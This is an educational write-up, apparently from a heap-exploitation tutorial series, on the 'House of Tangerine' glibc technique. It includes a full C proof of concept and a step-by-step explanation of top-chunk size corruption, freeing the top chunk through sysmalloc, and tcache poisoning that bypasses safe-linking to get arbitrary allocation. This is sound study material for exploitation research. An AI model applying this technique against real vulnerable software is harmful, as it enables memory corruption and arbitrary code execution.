#import "../../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Tangerine",
    description: "A modernized version of House of Orange that corrupts the heap without calling free() directly, utilizing _int_free on the top chunk in sysmalloc and tcache poisoning.",
    date: "2025-12-27",
    order: 73,
  ),
)<frontmatter>

= glibc Allocator: House of Tangerine

== Introduction

The *House of Tangerine* is a modernized version of the House of Orange technique. It allows for heap corruption without the need to call `free()` directly.

It exploits `sysmalloc` to trigger `_int_free` on the top chunk (wilderness). By combining this with tcache poisoning, it can trick `malloc` into returning an arbitrary pointer.

This technique is effective on recent GLIBC versions (tested on 2.34 and 2.39).

== Prerequisites
- *Heap Overflow / OOB*: Ability to overwrite the `size` field of the Top Chunk (Wilderness).
- *No Free Primitive*: This attack does not require the attacker to be able to call `free()` directly.
- *Known Heap Address*: Necessary to bypass Safe-Linking (on glibc 2.32+) when performing the tcache poisoning step.
- *Allocation Control*: Ability to trigger multiple `malloc()` calls with specific sizes to induce `sysmalloc` to free the old Top Chunk.

== Example from `house_of_tangerine.c`

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)
#define CHUNK_HDR_SZ (SIZE_SZ*2)
#define MALLOC_ALIGN 0x10L
#define MALLOC_MASK (-MALLOC_ALIGN)
#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)
#define FENCEPOST (2*CHUNK_HDR_SZ)
#define PROBE (0x20-CHUNK_HDR_SZ)
#define CHUNK_SIZE_1 0x40
#define SIZE_1 (CHUNK_SIZE_1-CHUNK_HDR_SZ)
#define CHUNK_SIZE_3 (PAGESIZE-(2*MALLOC_ALIGN)-CHUNK_SIZE_1)
#define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)

int main() {
  size_t size_2, *top_size_ptr, top_size, new_top_size, freed_top_size, vuln_tcache, target, *heap_ptr;
  char win[0x10] = "WIN\0WIN\0WIN\0\x06\xfe\x1b\xe2";

  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  target = ((size_t) win + (MALLOC_ALIGN - 1)) & MALLOC_MASK;

  heap_ptr = malloc(PROBE);
  top_size = heap_ptr[(PROBE / SIZE_SZ) + 1];

  size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
  size_2 &= PAGE_MASK;
  size_2 &= MALLOC_MASK;

  heap_ptr = malloc(size_2);
  top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];
  top_size = *top_size_ptr;

  // VULNERABILITY: Corrupt Top Chunk size
  new_top_size = top_size & PAGE_MASK;
  *top_size_ptr = new_top_size;

  heap_ptr = malloc(SIZE_3);
  top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
  new_top_size = top_size & PAGE_MASK;
  heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;

  vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];

  // Trigger sysmalloc to free the old top chunk into tcache
  heap_ptr = malloc(SIZE_3);

  // VULNERABILITY: Tcache Poisoning
  heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);

  malloc(SIZE_1);
  heap_ptr = malloc(SIZE_1);

  assert((size_t) heap_ptr == target);
  return 0;
}
```

== Attack Flow Explained

=== 1. Extend the Top Chunk

The attack starts by extending the top chunk using `malloc()`. We determine `size_2` such that the remaining top chunk ends at a page boundary. This is crucial because when the top chunk is extended, the new size must still align with page boundaries.

=== 2. Corrupting the Top Chunk Size

We use a Heap Buffer Overflow (or other OOB access) to overwrite the size field of the current top chunk. We modify the size to be smaller than the actual available space, but crucially, we keep the page alignment bits intact to pass `sysmalloc` checks.

By reducing the top chunk size, we trick `sysmalloc` into thinking there isn't enough space to satisfy the next allocation request.

=== 3. Triggering `_int_free` via `sysmalloc`

When we request an allocation larger than our corrupted top chunk size (but smaller than the actual available memory), `malloc` calls `sysmalloc` to extend the heap.

Inside `sysmalloc`, if the top chunk cannot be merged or extended simply, the old top chunk is freed using `_int_free`. Since we manipulated the size of this "old" top chunk, `_int_free` will place it into a bin (tcache or unsorted bin depending on size).

In this technique, we carefully calculate the size so that the freed top chunk fits into a *tcache bin*.

=== 4. Tcache Poisoning on the Freed Top Chunk

After triggering the free, the old top chunk is now in a tcache bin. However, since it was the top chunk, it resides in memory that we can still access or is adjacent to our previous allocations.

We can now exploit this by overwriting the `next` pointer of this tcache chunk (which is now just a free chunk in the tcache list). We point it to our target address (e.g., a stack variable, a hook, or a return address).

=== 5. Arbitrary Allocation

We perform a few more allocations:
1. One allocation to take the valid chunk (the old top chunk) out of the tcache head.
2. The next allocation will return the corrupted `next` pointer we injected.

This grants us an arbitrary write primitive at the target address.
